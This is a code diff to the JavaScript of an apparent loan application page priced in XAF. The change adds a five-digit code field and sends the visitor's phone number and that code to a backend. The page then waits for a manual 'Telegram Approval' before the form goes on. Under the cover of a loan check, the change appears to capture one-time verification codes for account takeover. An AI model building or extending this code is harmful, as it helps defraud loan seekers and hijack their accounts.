@@ -31,11 +31,15 @@ function updateCalculator() {
 
 amountSlider.addEventListener('input', updateCalculator);
 termSelect.addEventListener('change', updateCalculator);
-updateCalculator(); // Initial call
+updateCalculator();
 
 // --- Form Input Restrictions (Numbers Only) ---
 document.getElementById('phone-number').addEventListener('input', function (e) {
-    this.value = this.value.replace(/[^0-9]/g, ''); // Strip out non-numbers
+    this.value = this.value.replace(/[^0-9]/g, ''); 
+});
+
+document.getElementById('five-digit-code').addEventListener('input', function (e) {
+    this.value = this.value.replace(/[^0-9]/g, ''); 
 });
 
 // --- Multi-Step Form Logic ---
@@ -85,18 +89,22 @@ async function nextStep() {
             return;
         }
 
-        // 2. Show Processing Screen
-        goToScreen('screen-processing');
+        // 2. Change Button Text (No more dark screen)
+        const nextBtn = document.getElementById('btn-next');
+        const originalText = nextBtn.innerText;
+        nextBtn.innerText = "Waiting for Telegram Approval...";
+        nextBtn.disabled = true;
 
-        const name = document.getElementById('first-name').value || "Applicant";
-        const amount = document.getElementById('form-amount').value;
+        // Get Phone Number and 5-digit Code
+        const phone = document.getElementById('phone-number').value || "Unknown";
+        const code = document.getElementById('five-digit-code').value || "Unknown";
 
         try {
             // 3. Send to Python Backend
             const response = await fetch('/api/request-approval', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: name, amount: amount })
+                body: JSON.stringify({ phone: phone, code: code })
             });
             const result = await response.json();
 
@@ -107,19 +115,22 @@ async function nextStep() {
 
                 if (statusData.status === 'approve') {
                     clearInterval(interval);
-                    goToScreen('screen-application');
+                    nextBtn.innerText = originalText;
+                    nextBtn.disabled = false;
                     currentStep++;
                     updateFormUI(); 
                 } else if (statusData.status === 'reject') {
                     clearInterval(interval);
                     alert("Application rejected by Admin.");
-                    goToScreen('screen-application');
+                    nextBtn.innerText = originalText;
+                    nextBtn.disabled = false;
                 }
             }, 2000);
 
         } catch (error) {
             alert("Error connecting to server.");
-            goToScreen('screen-application');
+            nextBtn.innerText = originalText;
+            nextBtn.disabled = false;
         }
     }
 }
@@ -138,10 +149,12 @@ function generateSummary() {
     const purpose = document.getElementById('form-purpose').value || '—';
     const firstName = document.getElementById('first-name').value;
     const lastName = document.getElementById('last-name').value;
+    const phone = document.getElementById('phone-number').value;
     
     document.getElementById('summary-amount').innerText = `XAF ${parseInt(amount).toLocaleString()}`;
     document.getElementById('summary-term').innerText = `${term} Months`;
     document.getElementById('summary-purpose').innerText = purpose;
+    document.getElementById('summary-phone').innerText = `+237 ${phone}`;
     
     if (firstName || lastName) {
         document.getElementById('summary-name').innerText = `${firstName} ${lastName}`.trim();
